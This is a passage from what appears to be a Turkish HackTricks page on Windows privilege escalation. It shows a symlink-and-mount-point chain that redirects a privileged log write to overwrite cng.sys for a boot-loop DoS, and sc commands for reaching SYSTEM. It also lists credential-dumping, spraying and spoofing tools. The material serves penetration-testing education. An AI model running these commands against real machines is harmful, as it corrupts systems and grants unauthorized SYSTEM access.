- Klasörü görür, **gerçek driver’ı çözemede başarısız olur** ve **crash olur ya da boot’u durdurur**.
- **Fallback yoktur** ve dış müdahale olmadan **kurtarma yoktur** (ör. boot onarımı veya disk erişimi).

### Ayrıcalıklı log/backup yollarından + OM symlink’lerinden keyfi dosya üzerine yazma / boot DoS

Bir **ayrıcalıklı servis**, bir **yazılabilir config** içinden okunan bir yola log/export yazdığında, o yolu **Object Manager symlink’leri + NTFS mount point’leri** ile yönlendirerek ayrıcalıklı yazmayı keyfi bir overwrite’a dönüştürebilirsiniz (hatta **SeCreateSymbolicLinkPrivilege** olmadan bile).

**Gereksinimler**
- Hedef yolu saklayan config saldırgan tarafından yazılabilir olmalı (ör. `%ProgramData%\...\.ini`).
- `\RPC Control`’e bir mount point ve bir OM file symlink oluşturma yeteneği olmalı (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- O yola yazan bir ayrıcalıklı işlem olmalı (log, export, report).

**Örnek zincir**
1. Ayrıcalıklı log hedefini geri kazanmak için config’i oku; ör. `C:\ProgramData\ICONICS\IcoSetup64.ini` içindeki `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`.
2. Admin olmadan yolu yönlendir:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Ayrıcalıklı bileşenin log yazmasını bekleyin (ör. admin "send test SMS" tetikler). Yazma artık `C:\Windows\System32\cng.sys` içine düşer.
4. Üzerine yazılan hedefi (hex/PE parser) inceleyerek bozulmayı doğrulayın; yeniden başlatma Windows’un değiştirilmiş sürücü yolunu yüklemesini zorlar → **boot loop DoS**. Bu, ayrıcalıklı bir service’in yazmak için açacağı herhangi bir protected file için de genelleştirilebilir.

> `cng.sys` normalde `C:\Windows\System32\drivers\cng.sys` konumundan yüklenir, ancak `C:\Windows\System32\cng.sys` içinde bir kopya varsa önce bu denenebilir; bu da onu bozuk veri için güvenilir bir DoS sink yapar.



## **High Integrity'den System'e**

### **Yeni service**

Zaten bir High Integrity process üzerinde çalışıyorsanız, **SYSTEM'e giden yol** sadece **yeni bir service oluşturup çalıştırmak** kadar kolay olabilir:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Bir service binary oluştururken geçerli bir service olduğundan emin olun; ya da binary gerekli işlemleri yeterince hızlı gerçekleştirsin, çünkü geçerli bir service değilse 20 saniye içinde öldürülür.

### AlwaysInstallElevated

High Integrity bir process’ten **AlwaysInstallElevated registry entries**’i **enable** etmeyi ve bir _**.msi**_ wrapper kullanarak bir reverse shell **install** etmeyi deneyebilirsiniz.\
[İlgili registry key’ler ve bir _.msi_ package nasıl install edilir hakkında daha fazla bilgi burada.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Kodu burada** [**bulabilirsiniz**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Eğer bu token privilege’lara sahipseniz (muhtemelen bunu zaten High Integrity bir process içinde bulacaksınız), SeDebug privilege ile **neredeyse herhangi bir process’i** (protected processes değil) **open** edebilir, process’in **token**’ını **copy** edebilir ve bu token ile **arbitrary process** oluşturabilirsiniz.\
Bu teknik genellikle **SYSTEM olarak çalışan ve tüm token privilege’larına sahip herhangi bir process’i seçmek** için kullanılır (_evet, tüm token privilege’larına sahip olmayan SYSTEM process’leri bulabilirsiniz_).\
**Önerilen tekniği çalıştıran bir kod örneğini burada** [**bulabilirsiniz**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Bu teknik meterpreter tarafından `getsystem` içinde privilege escalation yapmak için kullanılır. Teknik, **bir pipe oluşturup ardından o pipe’a yazacak bir service oluşturma/kötüye kullanma** işleminden oluşur. Sonra, **SeImpersonate** privilege’ını kullanarak pipe’ı oluşturan **server**, pipe client’ının (service’in) **token**’ını **impersonate** edebilir ve SYSTEM privilege’ları elde eder.\
Name pipes hakkında [**daha fazla bilgi edinmek istiyorsanız bunu okuyun**](#named-pipe-client-impersonation).\
High integrity’den System’e name pipes kullanarak nasıl geçileceğine dair bir örnek okumak istiyorsanız [**bunu okuyun**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Eğer **SYSTEM** olarak çalışan bir **process** tarafından **loaded** edilen bir **dll**’yi **hijack** etmeyi başarırsanız, bu yetkilerle arbitrary code çalıştırabilirsiniz. Bu nedenle Dll Hijacking bu tür privilege escalation için de kullanışlıdır ve ayrıca High Integrity bir process’ten çok **daha kolay** elde edilebilir; çünkü dll’leri yüklemek için kullanılan klasörlerde **write permissions** olacaktır.\
**Dll hijacking hakkında daha fazla bilgi** [**burada**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Oku:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Daha fazla yardım

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Yararlı araçlar

**Windows local privilege escalation vektörlerini aramak için en iyi araç:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Yanlış yapılandırmaları ve hassas dosyaları kontrol eder (**[**buradan kontrol et**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Tespit edildi.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Bazı olası yanlış yapılandırmaları kontrol eder ve bilgi toplar (**[**buradan kontrol et**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Yanlış yapılandırmaları kontrol eder**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla ve RDP kayıtlı session bilgilerini çıkarır. Lokal kullanımda -Thorough kullanın.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager’dan crendentials çıkarır. Tespit edildi.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Toplanan parolaları domain genelinde spray eder**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh bir PowerShell ADIDNS/LLMNR/mDNS spoofer ve man-in-the-middle aracıdır.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Temel privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Bilinen privesc vulnerabilities’larını arar (Watson için DEPRECATED)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local kontroller **(Admin rights gerekir)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Bilinen privesc vulnerabilities’larını arar (VisualStudio kullanılarak compile edilmesi gerekir) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Yanlış yapılandırmaları aramak için host’u enumerate eder (privesc’ten çok bilgi toplama aracıdır) (compile edilmesi gerekir) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Birçok software’den credentials çıkarır (github’da precompiled exe)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp’ın C# portu**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Yanlış yapılandırmaları kontrol eder (github’da precompiled executable). Tavsiye edilmez. Win10’da iyi çalışmaz.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Olası yanlış yapılandırmaları kontrol eder (python’dan exe). Tavsiye edilmez. Win10’da iyi çalışmaz.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Bu gönderiye dayanarak oluşturulmuş araçtır (düzgün çalışmak için accesschk gerektirmez ama kullanabilir).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** çıktısını okur ve çalışan exploits önerir (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** çıktısını okur ve çalışan exploits önerir (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Projeyi doğru .NET sürümünü kullanarak compile etmeniz gerekir ([bunu görün](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Victim host’taki yüklü .NET sürümünü görmek için şunu yapabilirsiniz:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## References

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [ZDI - Node.js Trust Falls: Dangerous Module Resolution on Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [Node.js modules: loading from `node_modules` folders](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [Trail of Bits - C/C++ checklist challenges, solved](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [Microsoft Learn - RtlQueryRegistryValues function](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)

{{#include ../../banners/hacktricks-training.md}}
